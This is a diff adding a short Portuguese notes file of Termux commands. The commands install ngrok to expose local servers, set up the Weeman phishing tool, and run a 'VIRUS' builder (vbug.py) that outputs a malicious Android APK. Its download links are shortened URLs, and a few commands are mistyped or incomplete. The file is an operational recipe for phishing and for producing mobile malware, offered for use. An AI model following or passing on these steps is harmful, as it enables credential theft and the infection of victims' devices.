@@ -1,0 +1,80 @@
+				ES FILE EXPLORER PRO
+https://goo.gl/2uG4uE
+
+				INSTALL TERMUX
+https://goo.gl/4Q1od5
+
+
+				INSTALL NGROK
+
+- Serve para abrir porta para rede externa
+https://youtu.be/4jYIkDMmEYs
+
+termux-setup-storage
+https://ngrok.com/
+apt update
+cd /sdcard
+ls 
+cd Download
+cd ngrok-stable-linux-arm
+ls
+mv -v ngrok /$HOME
+chmod +x ngrok
+./ ngrok authtoken {xxxxx}
+ls
+./ngrok
+./ngrok http 350
+
+				INSTALL NGROK2
+https://ngrok.com/
+apt update
+ls
+cd storage
+ls
+cd download
+ls
+cd ngrok-stable-linux-arm
+ls
+Chmod +x ngrok
+mv ngrok /data/data/com.termux/files/home
+>> iniciar outro terminal <<
+ls
+./ngrok authtoken {xxxxx}
+./ngrok http 80
+
+				INSTALL WEEMAN
+
+https://youtu.be/Y_cgk5Ecaek
+
+apt update
+apt install git 
+git clone
+ls
+cd weeman
+ls
+python2 weeman.py
+show
+
+				VIRUS
+https://bit.ly/2LLHQAb
+apt update
+ls
+cd /sdcard/Download
+ls
+mv -v vbug.sip #HOME
+unzip vbug.zip
+ls
+cd vbug ls
+chmod +x vbug.py
+ls
+pytjon2 vbug.py
+choose 1
+e
+ls
+cd virus
+ls
+cd ELITE
+ls
+mv -v elite.apk /sdcard/Download
+
+
